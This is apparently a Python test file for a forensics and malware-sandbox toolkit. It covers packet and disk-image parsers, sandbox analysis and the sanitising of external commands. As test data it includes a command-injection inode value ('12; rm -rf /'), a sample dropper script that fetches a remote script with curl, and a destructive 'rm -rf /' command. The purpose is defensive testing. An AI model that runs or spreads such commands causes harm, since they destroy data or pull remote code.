from unittest.mock import MagicMock, patch
import pytest

from pfai.integrations.openclaw import OpenClawClient, _sanitize_external_value
from pfai.integrity.ledger import verify_stellar_anchor
from pfai.sandbox.sandbox import DockerSandbox, StaticFallbackSandbox, VMaxConfig, VMaxSandbox
from pfai.tools.forensics import (
    forensic_capabilities,
    parse_tshark_conversations,
    parse_tshark_protocol_hierarchy,
    parse_tsk_list_files,
    parse_tsk_partitions,
    tsk_extract_file,
)


def test_forensic_parsers_and_capabilities(tmp_path):
    caps = forensic_capabilities()
    assert set(caps) == {"tshark", "nmap", "mmls", "fls", "icat", "docker"}

    conv_raw = """TCP Conversations
10.0.0.2:1234 <-> 10.0.0.5:22  5 500 bytes  4 400 bytes  9 900 bytes
UDP Conversations
10.0.0.2:5353 <-> 10.0.0.9:53  2 180  1 90  3 270
"""
    convs = parse_tshark_conversations(conv_raw)
    assert len(convs) == 2
    assert convs[0]["proto"] == "tcp"
    assert convs[0]["total_frames"] == 9
    assert convs[1]["proto"] == "udp"
    assert convs[1]["total_frames"] == 3

    phs_raw = "eth frames:100 bytes:12000\n  ip frames:95 bytes:11500\n"
    phs = parse_tshark_protocol_hierarchy(phs_raw)
    assert phs[1]["protocol"] == "ip"
    assert phs[1]["frames"] == 95

    mmls_raw = "002:  00:000   0000002048   0000206847   0000204800   Linux (0x83)\n"
    parts = parse_tsk_partitions(mmls_raw)
    assert parts[0]["start"] == 2048
    assert parts[0]["description"] == "Linux (0x83)"

    fls_raw = "r/r * 45-128-1: tmp/dropper.sh\nr/r 12: etc/hosts\n"
    files = parse_tsk_list_files(fls_raw)
    assert files[0]["deleted"] is True
    assert files[0]["inode"] == "45-128-1"
    assert files[1]["deleted"] is False

    img = tmp_path / "disk.dd"
    img.write_bytes(b"fakeimg")
    with pytest.raises(ValueError, match="Inode inválido"):
        tsk_extract_file(str(img), "12; rm -rf /", tmp_path / "out.bin")

    with patch("pfai.tools.forensics._run_bytes", return_value=b"secret-payload"):
        ext = tsk_extract_file(str(img), "45-128-1", tmp_path / "out.bin", offset=2048)
    assert ext["size"] == 14
    assert (tmp_path / "out.bin").read_bytes() == b"secret-payload"


def test_sandboxes_static_docker_and_vmax(tmp_path):
    sample = tmp_path / "dropper.sh"
    sample.write_bytes(b"#!/bin/sh\ncurl http://10.0.0.99/a.sh\n")

    st = StaticFallbackSandbox().analyze(str(sample))
    assert st["status"] == "ok"
    assert st["file_type"] == "script"
    assert "http://10.0.0.99/a.sh" in st["urls"]
    assert "10.0.0.99" in st["ips"]
    assert "curl " in st["suspicious_indicators"]

    with patch("shutil.which", return_value=None):
        unavail_dock = DockerSandbox().analyze(str(sample))
        assert unavail_dock["status"] == "unavailable"

    with patch("shutil.which", return_value="/usr/bin/docker"), patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=0, stdout='{"sha256":"abc","size":10,"entropy":4.2}')
        dock = DockerSandbox(runtime="runsc").analyze(str(sample))
        assert dock["status"] == "ok"
        assert dock["runtime"] == "runsc"

    vm_unavail = VMaxSandbox(VMaxConfig(cli_path="nonexistent_vmax_bin")).analyze(str(sample))
    assert vm_unavail["status"] == "unavailable"

    vm_ok = VMaxSandbox(
        VMaxConfig(vm_id="vm-sec-1"),
        driver=lambda _p, sha, _t, cfg: {"reverted": cfg.snapshot, "sha": sha, "syscalls": 12},
    ).analyze(str(sample))
    assert vm_ok["status"] == "ok"
    assert vm_ok["telemetry"]["reverted"] == "clean-base"


def test_openclaw_sanitization_hmac_and_stellar_verify():
    sanitized = _sanitize_external_value({"command": "rm -rf /", "severity": "high"})
    assert "command" not in sanitized
    assert sanitized["untrusted_command"] == "rm -rf /"
    assert sanitized["severity"] == "high"

    client = OpenClawClient("https://openclaw.local/", token="tok", hmac_secret="sec")
    hdrs = client._signed_headers(b'{"a":1}')
    assert hdrs["Authorization"] == "Bearer tok"
    assert hdrs["X-PFAI-Signature"].startswith("sha256=")

    with patch("pfai.integrations.openclaw.requests.Session.post") as mock_post:
        resp = MagicMock()
        resp.json.return_value = {"exec": "bad", "status": "accepted"}
        mock_post.return_value = resp
        out = client.send_event({"kind": "alert"})
        assert out["untrusted_data"] is True
        assert "exec" not in out["data"]
        assert out["data"]["untrusted_exec"] == "bad"

    import base64
    root_hex = "ab" * 32
    val_b64 = base64.b64encode(bytes.fromhex(root_hex)).decode("ascii")
    with patch("stellar_sdk.Server") as mock_srv:
        mock_srv.return_value.operations.return_value.for_transaction.return_value.call.return_value = {
            "_embedded": {"records": [{"type": "manage_data", "name": "evidence_root", "value": val_b64}]}
        }
        res = verify_stellar_anchor("tx123", expected_hash=root_hex, testnet=True)
        assert res["found"] is True
        assert res["matches_expected"] is True
